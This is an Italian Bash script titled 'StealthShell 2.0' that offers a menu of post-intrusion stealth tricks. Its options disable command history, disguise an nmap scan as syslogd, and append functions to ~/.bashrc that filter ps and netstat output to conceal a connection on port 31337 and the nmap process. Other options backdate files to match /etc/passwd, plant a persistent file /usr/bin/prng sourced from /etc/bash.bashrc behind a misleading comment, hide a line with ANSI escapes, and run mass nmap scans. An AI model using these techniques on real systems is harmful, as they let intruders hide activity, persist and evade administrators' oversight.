#!/bin/bash
  
# Funzione per nascondere la cronologia dei comandi Bash
nascondi_bash_history() {
    export HISTFILE=/dev/null
    unset SSH_CONNECTION SSH_CLIENT
    echo "Cronologia dei comandi Bash nascosta."
}

# Funzione per "suicidarsi" quando si esce dalla shell
suicidati() {
    echo "Vuoi attivare la modalità suicida? (sì/no)"
    read risposta
    if [ "$risposta" = "sì" ]; then
        alias exit='kill -9 $$'
        echo "Modalità suicida attivata. Addio!"
    else
        echo "Modalità suicida non attivata."
    fi
}

# Funzione per nascondere un comando aggiungendo uno spazio prima
nascondi_comando() {
    echo "Vuoi nascondere il comando 'id'? (sì/no)"
    read risposta
    if [ "$risposta" = "sì" ]; then
        alias " id"=''
        echo "Comando 'id' nascosto."
    else
        echo "Comando 'id' non nascosto."
    fi
}

# Funzione per daemonizzare un comando
daemonizza_comando() {
    echo "Vuoi avviare un processo in background? (sì/no)"
    read risposta
    if [ "$risposta" = "sì" ]; then
        (exec -a syslogd nmap -T0 10.0.2.1/24) &
        echo "Processo avviato in background."
    else
        echo "Nessun processo avviato."
    fi
}

# Funzione per nascondere le opzioni di un comando
nascondi_opzioni_comando() {
    echo "Vuoi nascondere le opzioni del comando 'nmap'? (sì/no)"
    read risposta
    if [ "$risposta" = "sì" ]; then
        ./zapper -a klog nmap -T0 10.0.0.1/24
        echo "Opzioni del comando 'nmap' nascoste."
    else
        echo "Opzioni del comando 'nmap' non nascoste."
    fi
}

# Funzione per nascondere una connessione usando una funzione Bash in ~/.bashrc
nascondi_connessione_netstat() {
    echo "Vuoi nascondere una connessione usando una funzione Bash? (sì/no)"
    read risposta
    if [ "$risposta" = "sì" ]; then
        echo 'netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }' >>~/.bashrc \
        && touch -r /etc/passwd ~/.bashrc
        echo "Connessione nascosta."
    else
        echo "Connessione non nascosta."
    fi
}

# Funzione per nascondere un processo usando una funzione Bash in ~/.bashrc
nascondi_processo() {
    echo "Vuoi nascondere un processo usando una funzione Bash? (sì/no)"
    read risposta
    if [ "$risposta" = "sì" ]; then
        echo 'ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }' >>~/.bashrc \
        && touch -r /etc/passwd ~/.bashrc
        echo "Processo nascosto."
    else
        echo "Processo non nascosto."
    fi
}

# Funzione per nascondere un processo come utente root
nascondi_processo_root() {
    local pid=$1
    echo "Vuoi nascondere un processo come utente root? (sì/no)"
    read risposta
    if [ "$risposta" = "sì" ]; then
        hide $pid
        echo "Processo $pid nascosto."
    else
        echo "Processo $pid non nascosto."
    fi
}

# Funzione per nascondere uno script shell includendolo in ~/.bashrc
nascondi_script_shell() {
    echo "Vuoi nascondere uno script shell includendolo in ~/.bashrc? (sì/no)"
    read risposta
    if [ "$risposta" = "sì" ]; then
        echo -e 'netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }\
        \nps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }' >/usr/bin/prng \
        && echo ". prng #Initialize Pseudo Random Number Generator" >>/etc/bash.bashrc \
        && touch -r /etc/ld.so.conf /usr/bin/prng /etc/bash.bashrc
        echo "Script shell nascosto."
    else
        echo "Script shell non nascosto."
    fi
}

# Funzione per nascondere l'output del comando "id" usando caratteri di escape ANSI
nascondi_da_cat() {
    echo "Vuoi nascondere l'output del comando 'id' usando caratteri di escape ANSI? (sì/no)"
    read risposta
    if [ "$risposta" = "sì" ]; then
        echo -e "id #\\033[2K\\033[1A" >>~/.bashrc
        echo "Output del comando 'id' nascosto."
    else
        echo "Output del comando 'id' non nascosto."
    fi
}

# Funzione per eseguire comandi in parallelo su un elenco di host
esegui_in_parallelo() {
    echo "Vuoi eseguire comandi in parallelo su un elenco di host? (sì/no)"
    read risposta
    if [ "$risposta" = "sì" ]; then
        cat hosts.txt | parallel -j20 'exec nmap -n -Pn -sCV -F --open {} >nmap_{}.txt'
        echo "Comandi eseguiti in parallelo."
    else
        echo "Nessun comando eseguito in parallelo."
    fi
}# Menu principale
echo "Scegli un'opzione:"
echo "1. Nascondi la cronologia dei comandi Bash"
echo "2. Attiva la modalità suicida"
echo "3. Nascondi un comando"
echo "4. Daemonizza un comando"
echo "5. Nascondi le opzioni di un comando"
echo "6. Nascondi una connessione Netstat"
echo "7. Nascondi un processo"
echo "8. Nascondi un processo come utente root"
echo "9. Nascondi uno script shell"
echo "10. Nascondi l'output del comando 'id'"
echo "11. Esegui comandi in parallelo su un elenco di host"
echo "12. Esci"

# Leggi la scelta dell'utente
read -p "Scelta: " scelta

# Esegui l'azione corrispondente alla scelta dell'utente
case $scelta in
    1) nascondi_bash_history;;
    2) suicidati;;
    3) nascondi_comando;;
    4) daemonizza_comando;;
    5) nascondi_opzioni_comando;;
    6) nascondi_connessione_netstat;;
    7) nascondi_processo;;
    8) echo "Inserisci il PID del processo da nascondere:"; read pid; nascondi_processo_root $pid;;
    9) nascondi_script_shell;;
    10) nascondi_da_cat;;
    11) esegui_in_parallelo;;
    12) echo "Arrivederci!"; exit;;
    *) echo "Scelta non valida. Riprova."; exit;;
esac

cat << "EOF"
  _________.__               .__        __          
 /   _____/|__| ____ _____  |__| ____ |  | __ ____  
 \_____  \ |  |/    \\__  \ |  |/ ___\|  |/ // __ \ 
 /        \|  |   |  \/ __ \|  \  \___|    <\  ___/ 
/_______  /|__|___|  (____  /__|\___  >__|_ \\___  >
        \/         \/     \/        \/    by Gabriele D'Attile 
        StealthShell 2.0
